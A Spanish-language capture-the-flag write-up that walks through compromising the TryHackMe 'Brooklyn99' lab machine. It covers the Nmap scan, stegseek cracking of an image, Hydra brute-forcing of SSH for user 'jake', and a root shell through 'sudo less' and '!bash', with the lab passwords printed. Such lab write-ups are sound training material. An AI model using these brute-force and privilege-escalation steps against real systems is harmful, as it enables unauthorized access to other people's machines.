## **Tutorial: Explotación de la máquina Brooklyn99 en TryHackMe**


## 1. Conexión a la VPN de TryHackMe

Para poder acceder a las máquinas del laboratorio es necesario conectarse primero a la VPN de TryHackMe. Esto crea un túnel cifrado entre la máquina Kali y la red privada del laboratorio.

### 1.1 Conexión mediante OpenVPN

Desde la terminal de Kali ejecutamos el siguiente comando utilizando el archivo .ovpn descargado desde la plataforma:

```bash
sudo openvpn /home/nerea/Descargas/eu-central-1-nereacandonramos-regular.ovpn
```
Si este no funciona, probar el west-3-
Si la conexión se establece correctamente aparecerá el mensaje:

```bash
Initialization Sequence Completed
```

Esto indica que la VPN se ha establecido correctamente.

### 1.2 Verificación de la conexión

Para comprobar que la conexión está activa ejecutamos:

```bash
ip a
```

Esto mostrará una interfaz de red llamada tun0, que corresponde a la conexión VPN con TryHackMe.

## 2. Escaneo de puertos con Nmap

El siguiente paso consiste en identificar los servicios expuestos en la máquina objetivo utilizando Nmap, una herramienta fundamental para el reconocimiento en auditorías de seguridad.

Se ejecuta el siguiente comando:

Escaneo completo de puertos:

```bash
nmap -sC -sV -p- -T4 10.130.149.247
```

![nmap](Maquina_de_Linux/Brooklyn99/imagenes/nmap.png)

Resultados:
- 21/tcp → FTP (vsftpd 3.0.3) → acceso anónimo permitido
- 22/tcp → SSH
- 80/tcp → HTTP (Apache)

Punto clave: FTP permite acceso sin credenciales.


## 2. Análisis servicio web

Entramos a:

```bash
http://10.130.149.247
```

![url](Maquina_de_Linux/Brooklyn99/imagenes/url.png)


Hay una imagen de Brooklyn 99
Revisamos el código fuente

Encontramos la ruta de la imagen:

```bash
background-image: url("brooklyn99.jpg");
<!-- Have you ever heard of steganography? -->
```

![codigo](Maquina_de_Linux/Brooklyn99/imagenes/codigo.png)

La clave esta aquí: Imagen + esteganografía


## 3. Descargar imagen

La descargamos:

```bash
wget http://10.130.149.247/brooklyn99.jpg
```

![descargar](Maquina_de_Linux/Brooklyn99/imagenes/descargar.png)

## 4. Extraer información oculta

Uso stegseekpara extraer información oculta.

```bash
stegseek --crack brooklyn99.jpg /usr/share/wordlists/rockyou.txt out.txt
```

![extraer](Maquina_de_Linux/Brooklyn99/imagenes/extraer.png)


Miramos que el archivo ls esté extraído.

```bash
ls
```
Abrimos el archivo que hemos extraído.

```bash
cat out.txt
```

![cat](Maquina_de_Linux/Brooklyn99/imagenes/cat.png)

Conseguimos una contraseña que es: fluffydog12@ninenine


## 5. Descifrando la contraseña de Jake con Hydra.

Se utiliza Hydra para atacar el servicio SSH:

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.130.149.247 -T 60
```
El resultado obtenido es:

- login: jake   
- password: 987654321

![hydra](Maquina_de_Linux/Brooklyn99/imagenes/hydra.png)



## 6. Acceso al sistema (SSH)

```bash
ssh jake@10.130.149.247
```

![ssh](Maquina_de_Linux/Brooklyn99/imagenes/ssh.png)

Se introduce la contraseña obtenida: 987654321
Acceso conseguido.


Escalada de privilegios

Se revisan permisos sudo:

```bash
sudo -l
```

![sudo](Maquina_de_Linux/Brooklyn99/imagenes/sudo.png)

## 7. Escalada de privilegios

Se ejecuta less con privilegios de root:

```bash
sudo less /etc/passwd
```

![sudo](Maquina_de_Linux/Brooklyn99/imagenes/less.png)

Una vez dentro del visor less, se ejecuta el siguiente comando:

```bash
!bash
```

![sudo](Maquina_de_Linux/Brooklyn99/imagenes/bash.png)

Esto permite abrir una shell con privilegios de root.



## 8. Verificación de privilegios

Para comprobar que la escalada ha sido exitosa:

```bash
whoami
```

Resultado esperado:

```bash
root
```

![root](Maquina_de_Linux/Brooklyn99/imagenes/whoami.png)